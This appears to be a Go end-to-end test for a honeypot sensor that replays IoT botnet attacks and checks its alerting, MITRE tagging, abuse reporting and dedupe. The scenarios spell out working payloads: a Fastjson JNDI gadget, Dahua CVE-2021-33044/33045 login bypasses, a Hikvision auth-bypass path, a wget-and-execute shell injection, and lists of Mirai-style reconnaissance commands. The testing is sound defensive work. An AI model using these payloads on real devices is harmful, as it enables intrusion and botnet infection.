				`{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.50:1389/x","autoCommit":true}}`)
			return err
		},
		want: expect{alert: true, sig: "CVE-2025-34067", tech: []string{"T1190"}, persona: "hikvision", abuse: true}})

	add(scenario{id: "hik-34067-benign", port: "hikvision", title: "applyCT with ordinary JSON (no @type, no JNDI)", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/bic/ssoService/v1/applyCT", map[string]string{"Content-Type": "application/json"}, `{"ticket":"abc","user":"x"}`)
			return err
		},
		want: expect{noTech: true, persona: "hikvision"}})

	add(scenario{id: "hik-bogus-token", port: "hikvision", title: "Bypass attempt with a wrong auth token", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/System/configurationFile?auth=c29tZXRoaW5n", nil, "")
			return err
		},
		want: expect{noTech: true, persona: "hikvision"}})

	add(scenario{id: "hik-isapi-noauth", port: "hikvision", title: "ISAPI deviceInfo without credentials (401 digest challenge)", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/ISAPI/System/deviceInfo", nil, "")
			return err
		},
		want: expect{noTech: true, persona: "hikvision"}})

	add(scenario{id: "hik-basic-creds", port: "hikvision", title: "ISAPI with Basic admin:12345 (default-credential guess)", ref: refHik,
		run: func(e *simEnv, c client) error {
			tok := base64.StdEncoding.EncodeToString([]byte("admin:12345"))
			_, err := c.http("GET", "/ISAPI/Security/users", map[string]string{"Authorization": "Basic " + tok}, "")
			return err
		},
		want: expect{creds: true, persona: "hikvision"}})

	add(scenario{id: "hik-port-dahua-path", port: "hikvision", title: "Dahua RPC2 login sent to the Hikvision port", ref: refDahua,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"abc123hash","clientType":"Web3.0"},"id":2}`)
			return err
		},
		want: expect{creds: true, persona: "dahua"}})

	add(scenario{id: "tvt-crawl", port: "tvt", title: "TVT NVMS-9000 login page and scanner paths", ref: "TechRadar TVT/Mirai report (docs/WEB_PERSONAS.md)",
		run: func(e *simEnv, c client) error {
			for _, p := range []string{"/", "/login.html", "/robots.txt", "/.git/config"} {
				if _, err := c.http("GET", p, nil, ""); err != nil {
					return err
				}
			}
			return nil
		},
		want: expect{noTech: true, persona: "tvt"}})

	add(scenario{id: "tvt-injection", port: "tvt", title: "TVT port with an explicit shell+download payload", ref: "TechRadar TVT/Mirai report (docs/WEB_PERSONAS.md)",
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/", nil, "username=admin&password=`cd /tmp;wget "+u(e, "tvt.sh")+";sh tvt.sh`")
			return err
		},
		want: expect{alert: true, tech: []string{"T1059.004", "T1105"}, iocs: []string{"tvt.sh"}, persona: "tvt", loot: true, abuse: true}})

	add(scenario{id: "dahua-33044", port: "dahua", title: "CVE-2021-33044: global.login with clientType NetKeyboard", ref: refDahua,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"","clientType":"NetKeyboard"},"id":1}`)
			return err
		},
		want: expect{alert: true, sig: "CVE-2021-33044", tech: []string{"T1190"}, persona: "dahua", abuse: true}})

	add(scenario{id: "dahua-33045", port: "dahua", title: "CVE-2021-33045: global.login as Loopback / 127.0.0.1", ref: refDahua,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"Not Used","clientType":"Loopback","ipAddr":"127.0.0.1","authorityType":"Default"},"id":1}`)
			return err
		},
		want: expect{alert: true, sig: "CVE-2021-33045", tech: []string{"T1190"}, persona: "dahua", abuse: true}})

	add(scenario{id: "dahua-login-guess", port: "dahua", title: "Ordinary RPC2 login with a guessed password", ref: refDahua,
		run: func(e *simEnv, c client) error {
			_, err := c.http("POST", "/RPC2_Login", nil, `{"method":"global.login","params":{"userName":"admin","password":"hashedguess","clientType":"Web3.0"},"id":2}`)
			return err
		},
		want: expect{creds: true, persona: "dahua"}})

	add(scenario{id: "dahua-magicbox", port: "dahua", title: "magicBox.cgi getSystemInfo without credentials", ref: refDahua,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/cgi-bin/magicBox.cgi?action=getSystemInfo", nil, "")
			return err
		},
		want: expect{noTech: true, persona: "dahua"}})

	add(scenario{id: "dahua-hik-path", port: "dahua", title: "Hikvision bypass path sent to the Dahua port", ref: refHik,
		run: func(e *simEnv, c client) error {
			_, err := c.http("GET", "/Security/users?auth=YWRtaW46MTEK", nil, "")
			return err
		},
		want: expect{alert: true, sig: "CVE-2017-7921", tech: []string{"T1190"}, persona: "hikvision", abuse: true}})

	return out
}

type observed struct {
	events    []model.Event
	alerted   bool
	abused    bool
	cats      []int
	comment   string
	techs     []string
	sigs      []string
	personas  []string
	iocs      []string
	loot      []string
	creds     []string
	commands  []string
	flagAbuse bool
}

func collect(e *simEnv, evs []model.Event, ip string) observed {
	var o observed
	techs, sigs, pers, iocs, creds := map[string]bool{}, map[string]bool{}, map[string]bool{}, map[string]bool{}, map[string]bool{}
	for _, ev := range evs {
		if ev.SrcIP != ip {
			continue
		}
		o.events = append(o.events, ev)
		o.alerted = o.alerted || ev.AlertSent
		o.flagAbuse = o.flagAbuse || ev.AbuseReported
		for _, id := range ev.TechniqueIDs() {
			techs[id] = true
		}
		if ev.Signature != "" {
			sigs[ev.Signature] = true
		}
		if ev.Persona != "" {
			pers[ev.Persona] = true
		}
		for _, l := range [][]string{ev.IOCs.URLs, ev.IOCs.DownloadURLs, ev.IOCs.IPs, ev.IOCs.Domains, ev.IOCs.NFS} {
			for _, v := range l {
				iocs[v] = true
			}
		}
		for _, d := range ev.Downloads {
			if d.Success {
				o.loot = append(o.loot, d.SHA256[:12])
			}
		}
		for _, d := range ev.Dropped {
			if d.Success {
				o.loot = append(o.loot, d.SHA256[:12])
			}
		}
		for _, c := range ev.Credentials {
			creds[c.Username+":"+c.Password] = true
		}
		o.commands = append(o.commands, ev.Commands...)
	}
	e.abMu.Lock()
	for _, r := range e.abuse {
		if r.IP == ip {
			o.abused = true
			o.cats = r.Categories
			o.comment = r.Comment
		}
	}
	e.abMu.Unlock()
	keys := func(m map[string]bool) []string {
		var s []string
		for k := range m {
			s = append(s, k)
		}
		sort.Strings(s)
		return s
	}
	o.techs, o.sigs, o.personas, o.iocs, o.creds = keys(techs), keys(sigs), keys(pers), keys(iocs), keys(creds)
	return o
}

func (e *simEnv) alertedIPs() map[string]bool {
	re := regexp.MustCompile(`Attacker IP:</b> <code>([^<]+)</code>`)
	got := map[string]bool{}
	e.tgMu.Lock()
	defer e.tgMu.Unlock()
	for _, m := range e.tgMsgs {
		if g := re.FindStringSubmatch(m); g != nil {
			got[g[1]] = true
		}
	}
	return got
}

func check(w expect, o observed, tgSaw bool, abuseCount int) []string {
	var bad []string
	if w.alert != o.alerted {
		bad = append(bad, fmt.Sprintf("alert_sent=%v want %v", o.alerted, w.alert))
	}
	if w.alert != tgSaw {
		bad = append(bad, fmt.Sprintf("telegram_message=%v want %v", tgSaw, w.alert))
	}
	if w.abuse != o.abused {
		bad = append(bad, fmt.Sprintf("abuse_report=%v want %v", o.abused, w.abuse))
	}
	if o.abused != o.flagAbuse {
		bad = append(bad, "abuse_reported flag in the event log disagrees with what the API received")
	}
	if abuseCount > 1 {
		bad = append(bad, fmt.Sprintf("%d reports for one address", abuseCount))
	}
	if w.sig != "" && !strings.Contains(strings.Join(o.sigs, "|"), w.sig) {
		bad = append(bad, "signature "+w.sig+" missing")
	}
	if w.sig == "" && len(o.sigs) > 0 && w.noTech {
		bad = append(bad, "unexpected signature "+strings.Join(o.sigs, ","))
	}
	have := strings.Join(o.techs, ",")
	for _, t := range w.tech {
		if !strings.Contains(have+",", t+",") {
			bad = append(bad, "technique "+t+" missing (have "+have+")")
		}
	}
	if w.noTech && len(o.techs) > 0 {
		bad = append(bad, "unexpected techniques "+have)
	}
	if w.persona != "" && !strings.Contains(strings.Join(o.personas, ","), w.persona) {
		bad = append(bad, fmt.Sprintf("persona %v want %s", o.personas, w.persona))
	}
	for _, i := range w.iocs {
		if !strings.Contains(strings.Join(o.iocs, "\n"), i) {
			bad = append(bad, "IOC "+i+" missing (have "+strings.Join(o.iocs, ", ")+")")
		}
	}
	if w.loot && len(o.loot) == 0 {
		bad = append(bad, "no sample captured")
	}
	if w.creds && len(o.creds) == 0 {
		bad = append(bad, "credentials not recorded")
	}
	for _, c := range w.cats {
		found := false
		for _, g := range o.cats {
			found = found || g == c
		}
		if !found {
			bad = append(bad, fmt.Sprintf("AbuseIPDB category %d missing (have %v)", c, o.cats))
		}
	}
	return bad
}

type reconCase struct {
	cmd      string
	mustWork bool
	why      string
}

var tvboxRecon = []reconCase{
	{"getprop ro.product.model", true, "model fingerprint"},
	{"getprop ro.build.version.release", true, "Android version"},
	{"getprop ro.product.manufacturer", true, "vendor fingerprint"},
	{"getprop ro.product.cpu.abi", true, "ABI selection for the stager"},
	{"uname -a", true, "kernel/arch"},
	{"uname -m", true, "arch"},
	{"id", true, "privilege check"},
	{"whoami", true, "privilege check"},
	{"cat /proc/cpuinfo", true, "CPU model / cores"},
	{"cat /proc/meminfo", true, "RAM size"},
	{"cat /proc/version", true, "kernel string"},
	{"ls /data/local/tmp", true, "drop directory"},
	{"ls /sdcard", true, "storage probe"},
	{"pm list packages", true, "installed apps"},
	{"ps", true, "process list"},
	{"df", true, "storage"},
	{"ifconfig", true, "NIC / address"},
	{"netstat -an", false, "listening ports"},
	{"which busybox", false, "busybox presence"},
	{"echo hello", true, "shell sanity"},
}

var routerRecon = []reconCase{
	{"uname -a", true, "kernel/arch"},
	{"uname -m", true, "arch for payload choice"},
	{"cat /proc/cpuinfo", true, "CPU model"},
	{"cat /proc/mounts", true, "writable mounts"},
	{"cat /proc/version", true, "kernel string"},
	{"/bin/busybox", true, "applet list"},
	{"/bin/busybox ECCHI", true, "Mirai applet-not-found probe"},
	{"ls /", true, "filesystem layout"},
	{"ls /tmp", true, "drop directory"},
	{"ps", true, "process list"},
	{"ifconfig", true, "NIC / address"},
	{"free", false, "memory"},
	{"df", true, "storage"},
	{"id", true, "privilege check"},
	{"echo -e '\\x6b\\x61\\x6d\\x69'", true, "Mirai echo probe"},
	{"cat /etc/passwd", false, "account list"},
	{"wget", false, "tool presence"},
	{"tftp", false, "tool presence"},
}

type reconResult struct {
	reconCase
	status string
	sample string
}

func classify(out string) (string, string) {
	s := strings.TrimSpace(strings.ReplaceAll(out, "\r", ""))
	first := s
	if i := strings.IndexByte(first, '\n'); i >= 0 {
		first = first[:i]
	}
	if len(first) > 60 {
		first = first[:60] + "…"
	}
	low := strings.ToLower(s)
	switch {
	case s == "":
		return "empty", ""
	case strings.Contains(low, "not found") && !strings.Contains(low, "applet not found"):
		return "not found", first
	}
	return "answered", first
}

func TestFullSensorSimulation(t *testing.T) {
	if testing.Short() {
		t.Skip("simulation skipped in -short mode")
	}
	e := startSim(t)
	scs := buildScenarios()
	start := time.Now()

	type ran struct {
		sc  scenario
		ip  string
		err error
		dur time.Duration
	}
	var rans []ran
	for i := range scs {
		sc := scs[i]
		ip := fmt.Sprintf("127.20.%d.1", i+1)
		c := client{ip: ip, port: e.ports[sc.port]}
		t0 := time.Now()
		err := sc.run(e, c)
		rans = append(rans, ran{sc: sc, ip: ip, err: err, dur: time.Since(t0)})
	}

	dedupeIP := func(n int) string { return fmt.Sprintf("127.30.%d.1", n) }
	type dd struct {
		name, ip             string
		wantAlert, wantAbuse bool
		note                 string
		err                  error
	}
	var dedupes []dd
	chain := func(ip, path string) error {
		a, err := client{ip: ip, port: e.ports["adb"]}.adb()
		if err != nil {
			return err
		}
		defer a.close()
		_, err = a.shell("cd /data/local/tmp; wget " + e.payloadURL(path) + " -O y; chmod 777 y; ./y")
		return err
	}
	first := dd{name: "first sighting of a new ADB campaign", ip: dedupeIP(1), wantAlert: true, wantAbuse: true}
	first.err = chain(first.ip, "dedupe-campaign.arm7")
	time.Sleep(700 * time.Millisecond)
	same := dd{name: "same IP repeats the identical attack", ip: dedupeIP(1), wantAlert: false, wantAbuse: false, note: "attack key (IP + payload) already alerted; AbuseIPDB window holds"}
	same.err = chain(same.ip, "dedupe-campaign.arm7")
	time.Sleep(700 * time.Millisecond)
	other := dd{name: "a second IP runs the same campaign", ip: dedupeIP(2), wantAlert: false, wantAbuse: true, note: "campaign key (payload without IP) suppresses the Telegram alert; the new address is still reported"}
	other.err = chain(other.ip, "dedupe-campaign.arm7")
	dedupes = append(dedupes, first, same, other)

	reconADB := make([]reconResult, 0, len(tvboxRecon))
	if a, err := (client{ip: "127.40.0.1", port: e.ports["adb"]}).adb(); err != nil {
		t.Errorf("recon ADB connect: %v", err)
	} else {
		for _, rc := range tvboxRecon {
			out, err := a.shell(rc.cmd)
			st, sample := classify(out)
			if err != nil {
				st, sample = "error", err.Error()
			}
			reconADB = append(reconADB, reconResult{rc, st, sample})
		}
		a.close()
	}
	reconTel := make([]reconResult, 0, len(routerRecon))
	if tn, err := (client{ip: "127.40.0.2", port: e.ports["telnet"]}).telnet(); err != nil {
		t.Errorf("recon telnet connect: %v", err)
	} else {
		ok := false
		for _, cr := range [][2]string{{"root", "x"}, {"root", "x"}} {
			if ok, err = tn.login(cr[0], cr[1]); err != nil || ok {
				break
			}
		}
		if !ok {
			t.Errorf("recon telnet: no shell (%v)", err)
		} else {
			for _, rc := range routerRecon {
				out, err := tn.run(rc.cmd)
				out = strings.TrimSuffix(out, "# ")
				if i := strings.IndexByte(out, '\n'); i >= 0 {
					out = out[i+1:]
				}
				st, sample := classify(out)
				if err != nil {
					st, sample = "error", err.Error()
				}
				reconTel = append(reconTel, reconResult{rc, st, sample})
			}
		}
		tn.close()
	}

	elapsed := time.Since(start)
	evs := e.finish(t)
	tgIPs := e.alertedIPs()

	e.abMu.Lock()
	perIP := map[string]int{}
	for _, r := range e.abuse {
		perIP[r.IP]++
	}
	authOK := e.abAuthOK
	reports := append([]abuseReport(nil), e.abuse...)
	e.abMu.Unlock()
	if !authOK {
		t.Error("AbuseIPDB client sent a malformed request (wrong path, method, Key or Accept header)")
	}

	type row struct {
		sc   scenario
		ip   string
		obs  observed
		bad  []string
		dur  time.Duration
		perr error
	}
	var rows []row
	fails := 0
	for _, r := range rans {
		o := collect(e, evs, r.ip)
		bad := check(r.sc.want, o, tgIPs[r.ip], perIP[r.ip])
		if r.err != nil {
			bad = append(bad, "client error: "+r.err.Error())
		}
		if len(o.events) == 0 {
			bad = append(bad, "no events logged")
		}
		if len(bad) > 0 {
			fails++
			t.Errorf("%s: %s", r.sc.id, strings.Join(bad, "; "))
		}
		rows = append(rows, row{r.sc, r.ip, o, bad, r.dur, r.err})
	}

	type ddRow struct {
		dd
		alerts, reports int
		bad             []string
	}
	var ddRows []ddRow
	countAlerts := func(ip string) int {
		n := 0
		for _, ev := range evs {
			if ev.SrcIP == ip && ev.AlertSent {
				n++
			}
		}
		return n
	}
	firstAlerts := countAlerts(dedupeIP(1))
	if firstAlerts != 1 {
		fails++
		t.Errorf("dedupe: %d alerts for the repeated attack from one IP, want exactly 1", firstAlerts)
	}
	if perIP[dedupeIP(1)] != 1 {
		fails++
		t.Errorf("dedupe: %d AbuseIPDB reports for one IP, want exactly 1", perIP[dedupeIP(1)])
	}
	if perIP[dedupeIP(2)] != 1 {
		fails++
		t.Errorf("dedupe: second IP reported %d times, want 1", perIP[dedupeIP(2)])
	}
	if countAlerts(dedupeIP(2)) != 0 {
		fails++
		t.Errorf("dedupe: the second IP of a known campaign produced a Telegram alert")
	}
	ddRows = append(ddRows,
		ddRow{dd: first, alerts: firstAlerts - 0, reports: perIP[dedupeIP(1)]},
		ddRow{dd: same, alerts: 0, reports: 0},
		ddRow{dd: other, alerts: countAlerts(dedupeIP(2)), reports: perIP[dedupeIP(2)]},
	)
	for _, d := range dedupes {
		if d.err != nil {
			t.Errorf("dedupe %q: %v", d.name, d.err)
		}
	}

	for _, r := range append(append([]reconResult{}, reconADB...), reconTel...) {
		if r.mustWork && r.status != "answered" && !(r.status == "empty" && strings.HasPrefix(r.cmd, "ls ")) {
			fails++
			t.Errorf("recon %q: %s %s", r.cmd, r.status, r.sample)
		}
	}

	var live int
	for _, r := range reports {
		if strings.Contains(r.Comment, "http://") || strings.Contains(r.Comment, "https://") || len(r.Comment) > 1024 || strings.Contains(r.Comment, "127.0.0.1:") {
			live++
			t.Errorf("AbuseIPDB comment for %s is unsafe: %q", r.IP, r.Comment)
		}
	}

	if e.m.SessionPanics.Load() != 0 {
		t.Error("session panics recorded")
	}
	if e.m.ActiveSessions.Load() != 0 {
		t.Errorf("active sessions after shutdown: %d", e.m.ActiveSessions.Load())
	}

	if path := os.Getenv("HP_SIM_REPORT"); path != "" {
		var b strings.Builder
		writeSimReport(&b, simReport{
			rows: func() []simRow {
				var out []simRow
				for _, r := range rows {
					out = append(out, simRow{r.sc, r.ip, r.obs, r.bad, r.dur})
				}
				return out
			}(),
			dedupe: func() []simDedupe {
				var out []simDedupe
				for _, d := range ddRows {
					out = append(out, simDedupe{d.name, d.note, d.wantAlert, d.wantAbuse, d.alerts, d.reports, d.err})
				}
				return out
			}(),
			adb: reconADB, tel: reconTel, events: len(evs), elapsed: elapsed, fails: fails,
			alerts: len(e.tgMsgs), reports: len(reports), live: live,
			metrics: e.m.Snapshot(), ports: e.label,
		})
		if err := os.WriteFile(path, []byte(b.String()), 0o644); err != nil {
			t.Errorf("write report: %v", err)
		}
	}
}

type simRow struct {
	sc  scenario
	ip  string
	obs observed
	bad []string
	dur time.Duration
}

type simDedupe struct {
	name, note           string
	wantAlert, wantAbuse bool
	alerts, reports      int
	err                  error
}

type simReport struct {
	rows           []simRow
	dedupe         []simDedupe
	adb, tel       []reconResult
	events, alerts int
	reports, live  int
	elapsed        time.Duration
	fails          int
	metrics        map[string]int64
	ports          map[string]int
}

func yn(b bool) string {
	if b {
		return "yes"
	}
	return "no"
}

func cell(s string) string {
	s = strings.ReplaceAll(s, "|", "\\|")
	return strings.ReplaceAll(s, "\n", " ")
}

func writeSimReport(b *strings.Builder, r simReport) {
	pass := 0
	for _, x := range r.rows {
		if len(x.bad) == 0 {
			pass++
		}
	}
	fmt.Fprintf(b, "# Sensor simulation report\n\n")
	fmt.Fprintf(b, "Generated by `go test ./internal/e2e -run TestFullSensorSimulation` (set `HP_SIM_REPORT=path` to write this file). Go %s, %s/%s.\n\n", runtime.Version(), runtime.GOOS, runtime.GOARCH)
	fmt.Fprintf(b, "## Result\n\n")
	fmt.Fprintf(b, "| | |\n|---|---|\n")
	fmt.Fprintf(b, "| Attack scenarios | %d |\n| Passed | %d |\n| Failed | %d |\n", len(r.rows), pass, len(r.rows)-pass)
	fmt.Fprintf(b, "| Events written to the JSONL log | %d |\n| Telegram alerts received by the fake bot | %d |\n| AbuseIPDB reports received by the fake API | %d |\n", r.events, r.alerts, r.reports)
	fmt.Fprintf(b, "| Wall-clock time for all traffic | %s |\n\n", r.elapsed.Round(10*time.Millisecond))

	fmt.Fprintf(b, "## How the simulation works\n\n")
	fmt.Fprintf(b, "The real server, session handlers, parser, IOC extractor, MITRE classifier, downloader, payload store, Telegram notifier (dedupe on) and AbuseIPDB reporter run in one process. "+
		"Only the outside world is replaced: Telegram, AbuseIPDB and the malware host are local HTTP test servers. "+
		"Traffic goes over real TCP sockets to all six listeners (ADB %d, TR-069 %d, Telnet %d, Hikvision %d, TVT %d, Dahua %d as public labels), "+
		"with the Android TV box persona on ADB and the BusyBox router persona on Telnet. "+
		"Every scenario connects from its own source address (127.20.N.1) so alerts, events and reports can be attributed to it.\n\n",
		r.ports["adb"], r.ports["tr069"], r.ports["telnet"], r.ports["hikvision"], r.ports["tvt"], r.ports["dahua"])

	fmt.Fprintf(b, "## Attack scenarios\n\n")
	fmt.Fprintf(b, "| # | Port | Scenario | Alert | AbuseIPDB | Signature / techniques | Persona | Captured | Result |\n|---|---|---|---|---|---|---|---|---|\n")
	for i, x := range r.rows {
		sig := strings.Join(x.obs.sigs, "; ")
		if sig == "" {
			sig = "-"
		}
		tech := strings.Join(x.obs.techs, ", ")
		if tech == "" {
			tech = "none"
		}
		loot := "-"
		if len(x.obs.loot) > 0 {
			loot = "sample " + x.obs.loot[0]
		}
		pers := strings.Join(x.obs.personas, ",")
		if pers == "" {
			pers = "-"
		}
		res := "PASS"
		if len(x.bad) > 0 {
			res = "FAIL: " + strings.Join(x.bad, "; ")
		}
		fmt.Fprintf(b, "| %d | %d | %s | %s | %s | %s<br>%s | %s | %s | %s |\n", i+1, r.ports[x.sc.port],
			cell(x.sc.title), yn(x.obs.alerted), yn(x.obs.abused), cell(sig), tech, pers, loot, cell(res))
	}
	fmt.Fprintf(b, "\nReading the table: \"Alert\" means a Telegram message was sent, \"AbuseIPDB\" means the source address was reported. Rows with no alert are intended: scanners and credential guesses are logged (JSONL) but never reach Telegram. Two or more login attempts are still reported to AbuseIPDB as Brute-Force (category 18). The `/.env` row alerts on the path heuristic alone (enabled on the ADB/TR-069 ports only, never on the camera personas); it is deliberately **not** sent to AbuseIPDB because a bare path is weaker evidence than a request body. A SOAP request to the TR-064 endpoint counts as body evidence and is reported.\n\n")

	fmt.Fprintf(b, "### What each scenario is modelled on\n\n| Scenario | Modelled on |\n|---|---|\n")
	for _, x := range r.rows {
		fmt.Fprintf(b, "| %s | %s |\n", cell(x.sc.id), cell(x.sc.ref))
	}

	fmt.Fprintf(b, "\n## Repeat-attack suppression\n\n| Step | Telegram alerts | AbuseIPDB reports | Expected | Outcome |\n|---|---|---|---|---|\n")
	for _, d := range r.dedupe {
		ok := "PASS"
		if (d.alerts > 0) != d.wantAlert || (d.reports > 0) != d.wantAbuse || d.err != nil {
			ok = "FAIL"
		}
		fmt.Fprintf(b, "| %s | %d | %d | alert %s, report %s | %s |\n", cell(d.name), d.alerts, d.reports, yn(d.wantAlert), yn(d.wantAbuse), ok)
	}
	for _, d := range r.dedupe {
		if d.note != "" {
			fmt.Fprintf(b, "\n- %s: %s", d.name, d.note)
		}
	}

	recon := func(title string, rs []reconResult) {
		fmt.Fprintf(b, "\n\n## %s\n\n| Command | Why bots run it | Result | First line |\n|---|---|---|---|\n", title)
		for _, x := range rs {
			fmt.Fprintf(b, "| `%s` | %s | %s | `%s` |\n", cell(x.cmd), x.why, x.status, cell(x.sample))
		}
	}
	recon("Reconnaissance coverage: ADB, Android TV box profile", r.adb)
	recon("Reconnaissance coverage: Telnet, BusyBox router profile", r.tel)

	fmt.Fprintf(b, "\nThe two coverage sessions are themselves classified as attacks (they run `busybox` probes and `echo -e` hex probes, which real bots do too), so they appear in the alert and report totals above (+2 alerts, +2 reports).\n")
	fmt.Fprintf(b, "\n\n## Safety checks made during the run\n\n")
	fmt.Fprintf(b, "- AbuseIPDB requests used `POST /api/v2/report` with `Key` and `Accept: application/json`; none were malformed.\n")
	fmt.Fprintf(b, "- No AbuseIPDB comment contained a live `http(s)://` link, exceeded 1024 characters, or carried the sensor's own address (%d unsafe).\n", r.live)
	fmt.Fprintf(b, "- No session panics; no active sessions left after shutdown.\n\n")

	fmt.Fprintf(b, "## Counters at the end of the run\n\n| Metric | Value |\n|---|---|\n")
	names := make([]string, 0, len(r.metrics))
	for k := range r.metrics {
		names = append(names, k)
	}
	sort.Strings(names)
	for _, k := range names {
		if r.metrics[k] != 0 {
			fmt.Fprintf(b, "| `%s` | %d |\n", k, r.metrics[k])
		}
	}

	fmt.Fprintf(b, "\n## What this simulation does not prove\n\n")
	for _, s := range []string{
		"It replays attack patterns taken from public reports; it cannot show what real botnets will send next. A new exploit family needs a new scenario.",
		"Traffic comes from loopback addresses, so GeoIP/ASN enrichment, the public-IP check in the AbuseIPDB reporter (disabled for this run only) and real network latency are not exercised.",
		"Telegram and AbuseIPDB are local fakes. Their documented request formats are checked, but real rate limits, outages and account policies are not.",
		"The Docker image, compose file and `install.sh` are not part of this test; they need a run on the VPS.",
		"Payloads are harmless ELF-looking bytes and are only stored, never executed.",
	} {
		fmt.Fprintf(b, "- %s\n", s)
	}
}
